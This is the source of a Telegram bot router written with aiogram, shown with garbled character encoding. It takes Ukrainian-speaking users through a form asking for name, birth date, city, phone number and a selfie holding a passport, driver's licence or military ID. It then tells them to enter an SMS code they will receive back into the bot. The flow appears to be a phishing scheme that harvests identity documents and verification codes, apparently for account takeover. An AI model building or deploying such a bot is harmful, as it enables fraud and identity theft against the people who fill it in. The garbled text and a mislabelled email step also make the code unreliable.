from aiogram import Router, types, F
from aiogram.fsm.context import FSMContext
from states.form_states import Form
from keyboard.inline import next_keyboard, confirm_keyboard
from database.db import save_user_data

router = Router()

# --- –≠—Ç–∞–ø 1. –ù–∞–∂–∞—Ç–∞ –∫–Ω–æ–ø–∫–∞ "–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å" –ø–æ—Å–ª–µ /start
@router.callback_query(F.data == "continue_form")
async def send_form_intro(callback: types.CallbackQuery):
    await callback.message.edit_caption(
        caption="–î–ª—è –ø–æ—á–∞—Ç–∫—É –∑–∞–ø–æ–≤–Ω—ñ—Ç—å –Ω–µ–≤–µ–ª–∏–∫—É –∞–Ω–∫–µ—Ç—É –ø—Ä–æ —Å–µ–±–µ.",
        reply_markup=next_keyboard()
    )

# --- –≠—Ç–∞–ø 2. –ù–∞—á–∞–ª–æ –∞–Ω–∫–µ—Ç—ã
@router.callback_query(F.data == "next_question")
async def ask_full_name(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.full_name)
    await callback.message.answer("–í–∫–∞–∂—ñ—Ç—å –ü–Ü–ë:\n"
    "–ó—Ä–∞–∑–æ–∫: –ë–æ—Ä–∏—Å–µ–Ω–∫–æ –°–µ—Ä–≥—ñ–π –í–∞–ª–µ—Ä—ñ–π–æ–≤–∏—á")

# --- –≠—Ç–∞–ø 3. –í–æ–ø—Ä–æ—Å—ã –∞–Ω–∫–µ—Ç—ã ---
@router.message(Form.full_name)
async def process_full_name(message: types.Message, state: FSMContext):
    await state.update_data(full_name=message.text)
    await state.set_state(Form.age)
    await message.answer("–í–∫–∞–∂—ñ—Ç—å –¥–∞—Ç—É –Ω–∞—Ä–æ–¥–∂–µ–Ω–Ω—è (–î–î.–ú–ú.–†–†–†–†):\n"
    "–ó—Ä–∞–∑–æ–∫: 10.05.1990")

@router.message(Form.age)
async def process_age(message: types.Message, state: FSMContext):
    await state.update_data(age=message.text)
    await state.set_state(Form.city)
    await message.answer("–í–∫–∞–∂—ñ—Ç—å –º—ñ—Å—Ç–æ –ø—Ä–æ–∂–∏–≤–∞–Ω–Ω—è:\n"
    "–ó—Ä–∞–∑–æ–∫: –ö–∏—ó–≤")

@router.message(Form.city)
async def process_city(message: types.Message, state: FSMContext):
    await state.update_data(city=message.text)
    await state.set_state(Form.phone)
    await message.answer("–í–∫–∞–∂—ñ—Ç—å –º–æ–±—ñ–ª—å–Ω–∏–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É:\n"
    "–ó—Ä–∞–∑–æ–∫: +380501105011")

@router.message(Form.phone)
async def process_phone(message: types.Message, state: FSMContext):
    await state.update_data(phone=message.text)
    await state.set_state(Form.email)
    await message.answer("–í–∫–∞–∂—ñ—Ç—å –ø—Ä–∏–±–ª–∏–∑–Ω—É –ø–ª–æ—â—É –≤–∞—à–æ–≥–æ –∂–∏—Ç–ª–∞ (–ø—Ä–∏–º—ñ—â–µ–Ω–Ω—è):\n"
    "–ó—Ä–∞–∑–æ–∫: 45 –º¬≤")

@router.message(Form.email)
async def process_email(message: types.Message, state: FSMContext):
    await state.update_data(email=message.text)
    await state.set_state(Form.document_photo)
    await message.answer("–î–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –æ—Å–æ–±–∏, –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –Ω–∞–¥–∞—Ç–∏ —Å–µ–ª—Ñ—ñ –∑—ñ —Å–≤–æ—ó–º –¥–æ–∫—É–º–µ–Ω—Ç–æ–º:\n"
    "–ü—ñ–¥—ñ–π–¥–µ –±—É–¥—å-—è–∫–∏–π –∑ —Ç–∞–∫–∏—Ö –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤:\n"
    "1. –ü–∞—Å–ø–æ—Ä—Ç –≥—Ä–æ–º–∞–¥—è–Ω–∏–Ω–∞ –£–∫—Ä–∞—ó–Ω–∏ (ID-–∫–∞—Ä—Ç–∫–∞ –∞–±–æ –∫–Ω–∏–∂–∫–∞);\n"
    "2. –ó–∞–∫–æ—Ä–¥–æ–Ω–Ω–∏–π –ø–∞—Å–ø–æ—Ä—Ç;\n"
    "3. –í–æ–¥—ñ–π—Å—å–∫—ñ –ø—Ä–∞–≤–∞;\n"
    "4. –ü–æ—Å–≤—ñ–¥—á–µ–Ω–Ω—è –æ—Å–æ–±–∏ –≤—ñ–π—Å—å–∫–æ–≤–æ—Å–ª—É–∂–±–æ–≤—Ü—è.\n")

# --- –≠—Ç–∞–ø 4. –ü–æ–ª—É—á–µ–Ω–∏–µ —Ñ–æ—Ç–æ ---
@router.message(Form.document_photo, F.photo)
async def process_document_photo(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    photo_id = message.photo[-1].file_id

    data = await state.get_data()
    data["document_photo"] = photo_id
    save_user_data(user_id, data)

    await state.clear()

    await message.answer(
        "–î—è–∫—É—î–º–æ –∑–∞ –∑–∞–ø–æ–≤–Ω–µ–Ω—É –∞–Ω–∫–µ—Ç—É!\n" \
        "–ü—Ä–æ—Ç—è–≥–æ–º 24 –≥–æ–¥–∏–Ω –Ω–∞ –≤–∞—à –º–æ–±—ñ–ª—å–Ω–∏–π —Ç–µ–ª–µ—Ñ–æ–Ω –Ω–∞–¥—ñ–π–¥–µ SMS-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –∫–æ–¥–æ–º –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –∞–Ω–∫–µ—Ç–∏.\n" \
        "\n" \
        "–©–æ —Ä–æ–±–∏—Ç–∏ –¥–∞–ª—ñ:\n" \
        "1. –û—Ç—Ä–∏–º–∞–π—Ç–µ –∫–æ–¥ –∑ SMS\n" \
        "2. –ü–æ–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –≤ —Ü–µ–π —á–∞—Ç-–±–æ—Ç\n" \
        "3. –í–≤–µ–¥—ñ—Ç—å –æ—Ç—Ä–∏–º–∞–Ω–∏–π –∫–æ–¥ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ —Ü–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è\n" \
        "\n" \
        "--–£–≤–∞–≥–∞! –ù–µ –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ –∫–æ–¥ –Ω—ñ–∫–æ–º—É –≤ –ø—Ä–∏–≤–∞—Ç–Ω–∏—Ö –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è—Ö. –ú–∏ –π–æ–≥–æ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏–º–µ–º–æ –ª–∏—à–µ –≤ –æ—Ñ—ñ—Ü—ñ–π–Ω–æ–º—É –±–æ—Ç—ñ.\n" \
        "--–Ø–∫—â–æ SMS –Ω–µ –Ω–∞–¥—ñ–π—à–ª–æ, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ñ—Å—Ç—å –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω—É –≤ –∞–Ω–∫–µ—Ç—ñ –∞–±–æ –∑–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –Ω–∞—à–æ—ó —Å–ª—É–∂–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏.\n",
        reply_markup=confirm_keyboard()
    )

# --- –≠—Ç–∞–ø 5. –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ ---
@router.callback_query(F.data == "confirm_sms")
async def confirm_sms(callback: types.CallbackQuery):
    await callback.message.answer("üì© (–ó–¥–µ—Å—å –±—É–¥–µ—Ç –ª–æ–≥–∏–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –°–ú–°...)")
